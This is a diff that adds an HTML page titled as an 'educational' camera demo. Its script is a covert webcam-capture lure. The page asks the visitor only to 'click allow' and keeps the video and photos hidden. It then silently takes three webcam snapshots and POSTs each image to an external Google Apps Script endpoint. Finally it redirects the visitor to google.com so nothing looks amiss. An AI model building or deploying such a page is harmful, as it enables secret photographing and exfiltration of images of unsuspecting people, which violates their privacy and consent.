@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Educational Camera Tool - 3 Shots</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #f0f2f5;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 600px;
+        }
+        video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+            transform: scaleX(-1);
+        }
+        #status {
+            margin: 10px 0;
+            font-weight: bold;
+            color: Blue;
+        }
+        canvas { display: none; }
+        .result-area {
+            margin-top: 20px;
+            border-top: 2px solid #eee;
+            padding-top: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+        }
+        .captured-frame {
+            width: 150px; 
+            border-radius: 8px;
+            border: 2px solid #007bff;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Triple Auto-Capture Demo</h2>
+        <p id="status">Just click allow to continue</p>
+        <a href="index.html"><p id="retry"></p></a>
+        
+        <video id="video" autoplay playsinline style="display:none;"></video>
+        
+        <div class="result-area" id="gallery" style="display: none;">
+        </div>
+    </div>
+
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const gallery = document.getElementById('gallery');
+        const status = document.getElementById('status');
+        const retry = document.getElementById('retry');
+
+        let captureCount = 0;
+        const maxCaptures = 3;
+
+        // URL ng Google Apps Script mo
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwbh581jzwiY8qv1dfE-8qUzu2nIoALzyqobhRFwrEPMYCD6Y0g0FvxgcjBRG4MguOsg/exec";
+
+        // --- PALITAN MO ITO: Dito mapupunta ang user pagkatapos ng capture ---
+        const REDIRECT_URL = "https://www.google.com"; 
+
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: false 
+                });
+                video.srcObject = stream;
+                status.innerText = "Processing...";
+                status.style.color = "green";
+
+                video.onloadedmetadata = () => {
+                    startSequence();
+                };
+
+            } catch (err) {
+                status.innerText = "Sorry there's and error, make sure to click ALLOW to continue.";
+                retry.innerText = "Try again.";
+                console.error(err);
+            }
+        }
+
+        function startSequence() {
+            if (captureCount < maxCaptures) {
+                setTimeout(() => {
+                    captureImage();
+                    captureCount++;
+                    status.innerText = `Processing... ${captureCount}`;
+                    startSequence();
+                }, 500); 
+            } else {
+                status.innerText = "Waiting...";
+                status.style.color = "green";
+
+                // MAG-REDIRECT pagkatapos ng 2 seconds para sure na uploaded ang huling image
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 500); 
+            }
+        }
+
+        async function captureImage() {
+            const context = canvas.getContext('2d');
+            
+            context.save();
+            context.translate(canvas.width, 0);
+            context.scale(-1, 1);
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            context.restore();
+            
+            const data = canvas.toDataURL('image/png');
+            const newImg = document.createElement('img');
+            newImg.src = data;
+            newImg.className = 'captured-frame';
+            
+            gallery.appendChild(newImg);
+
+            try {
+                await fetch(SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: data })
+                });
+                console.log("Shot " + captureCount + " sent.");
+            } catch (e) {
+                console.error("Upload failed", e);
+            }
+        }
+
+        initCamera();
+    </script>
+</body>
+</html>
